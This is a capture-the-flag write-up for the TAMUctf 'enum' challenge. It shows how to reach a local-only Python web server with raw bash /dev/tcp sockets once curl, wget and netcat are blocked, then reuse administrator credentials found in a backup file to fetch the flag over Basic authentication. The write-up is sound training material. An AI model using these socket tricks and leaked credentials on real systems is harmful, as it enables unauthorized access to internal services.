# enum (misc 150)
## Description
Find the hidden flag.<br>
```ssh tamuctf@shell2.ctf.tamu.edu -p 2222```<br>
password: tamuctf

## Information gathering
After logging in to the given server and looking around, we found following interesting stuff on the system
### pyserver.py 9000
```ps -aux``` shows that there is a server running on port **9000**.
After a short port scan it was clear, the server is **not reachable remotely**. We need to connect to the server "**locally**".

### /var/backups/.srv.bak
```
Our lazy IT guy hasn't set up our apache server yet, so we have to use some weird snake-server in the meantime.
Save this file as a backup for the credentials.

uname: administrator
passwd: dcVMOlH5e6Hd1LGHXLmWzFhjqMu2/nIP9CXt23aq2CE
```
This seems to be credentials, we probably need later.
## Exploting
It was clear we need a way to connect to the local server on port 9000.
That was quite tricky, since we were not able to use ```curl```, ```wget```, ```netcat``` and consorters.
But we got ```bash``` and bash is able to **open TCP/UDP sockets**.

```$ exec {file-descriptor}<>/dev/{protocol}/{host}/{port}```

>The "file descriptor" is a unique non-negative integer associated with each socket. File descriptors 0, 1 and 2 are reserved for stdin, stdout and stderr, respectively. Thus you must specify 3 or higher (whichever is unused) as a file descriptor.
"<>" implies that the socket is open for both reading and writing. Depending on your need, you can open a socket for read-only (<) or write-only (>).
The "protocol" field can be either tcp or udp. The "host" and "port" fields are self-explanatory.<br>
taken from http://xmodulo.com

```bash
exec 5</dev/tcp/localhost/9000
echo -e "GET / HTTP/1.0\n" >&5
cat <&5
```
This returned a **401 Unauthorized**. That indicates, we need the credentials from the backup.
```
HTTP/1.0 401 Unauthorized
Server: SimpleHTTP/0.6 Python/2.7.12
Date: Mon, 19 Feb 2018 12:08:07 GMT
WWW-Authenticate: Basic realm="Test"
Content-type: text/html
```
Lets prepare the [correct header](https://en.wikipedia.org/wiki/Basic_access_authentication#Client_side):

administrator:dcVMOlH5e6Hd1LGHXLmWzFhjqMu2/nIP9CXt23aq2CE<br>
in base64<br>
YWRtaW5pc3RyYXRvcjpkY1ZNT2xINWU2SGQxTEdIWExtV3pGaGpxTXUyL25JUDlDWHQyM2FxMkNF

```bash
exec 5</dev/tcp/localhost/9000
echo -e "GET / HTTP/1.0\nAuthorization: Basic YWRtaW5pc3RyYXRvcjpkY1ZNT2xINWU2SGQxTEdIWExtV3pGaGpxTXUyL25JUDlDWHQyM2FxMkNF\n" >&5
cat <&5
```
That returned a **200 OK** with the following content. That indicates our authentication was correct.
```
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/2.7.12
Date: Mon, 19 Feb 2018 12:09:48 GMT
Content-type: text/html; charset=ANSI_X3.4-1968
Content-Length: 258

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><html>
<title>Directory listing for /</title>
<body>
<h2>Directory listing for /</h2>
<hr>
<ul>
<li><a href=".flag.txt">.flag.txt</a>
<li><a href="pyserver.py">pyserver.py</a>
</ul>
<hr>
</body>
</html>
```
**Finaly payload:**
```bash
exec 5</dev/tcp/localhost/9000
echo -e "GET /.flag.txt HTTP/1.0\nAuthorization: Basic YWRtaW5pc3RyYXRvcjpkY1ZNT2xINWU2SGQxTEdIWExtV3pGaGpxTXUyL25JUDlDWHQyM2FxMkNF\n" >&5
cat <&5
```
